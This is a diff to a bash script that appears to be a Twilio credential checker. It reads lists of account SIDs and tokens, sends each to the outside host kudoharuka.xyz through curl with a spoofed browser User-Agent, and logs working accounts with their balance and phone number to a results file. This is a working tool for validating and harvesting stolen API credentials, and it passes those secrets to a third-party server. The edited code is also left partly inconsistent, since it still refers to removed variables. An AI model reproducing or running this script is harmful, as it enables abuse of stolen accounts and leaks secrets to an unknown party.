@@ -37,16 +37,16 @@ updater
 esac
 done
 TwilliocURL(){
-	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://kudoharuka.xyz/twilio.php?sid=${keyna}&token=${secret}" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
+	gET=$(curl -skL --connect-timeout 15 --max-time 15 "http://kudoharuka.xyz/twilio.php?send=$1" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: id,en-US;q=0.7,en;q=0.3' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'TE: Trailers' -L)
 }
 TwilioREsulT(){
-	TwilliocURL $1 $2
+	TwilliocURL $1
 	credit=$(echo $gET | grep -Po '(?<=Balance":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 	phone=$(echo $gET | grep -Po '(?<=Phone":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
-	Currency=$(echo $gET | grep -Po '(?<=Currency":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
+	type=$(echo $gET | grep -Po '(?<=Type":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 	statusaccount=$(echo $gET | grep -Po '(?<=error":)[^},]*' | tr -d '[]"' | sed 's/\(<[^>]*>\|<\/>\|{1|}\)//g')
 	if [[ $statusaccount =~ "200" ]]; then
-		printf "${labelijo}-- TWILIO LIVE --${normal} ${bold} ${1}|${2} - $credit ($Currency)\n"
+		printf "${labelijo}-- TWILIO LIVE --${normal} ${bold} ${1}|${2} - $credit ($type)\n"
 		echo "WORKED => $keyna|$secret - $credit ($Currency) ($phone)">>result/twilioinfo.txt
 	else
 		printf "${labelmerah}-- TWILIO ERROR --${normal} ${bold} ${1}\n"
@@ -212,11 +212,10 @@ elif [ $pilihan -eq "3" ]; then
 	waktumulai=$(date +%s)
 	for (( i = 0; i <"${#bacot[@]}"; i++ )); do
 		WOW="${bacot[$i]}"
-		IFS='|' read -r -a array <<< "$WOW"
+		IFS='' read -r -a array <<< "$WOW"
 		keyna=${array[0]}
-		secret=${array[1]}
 		((cthread=cthread%2)); ((cthread++==0)) && wait
-		ProSeSTwilio ${keyna} ${secret} &
+		ProSeSTwilio ${keyna} &
 	done
 	wait
 fi
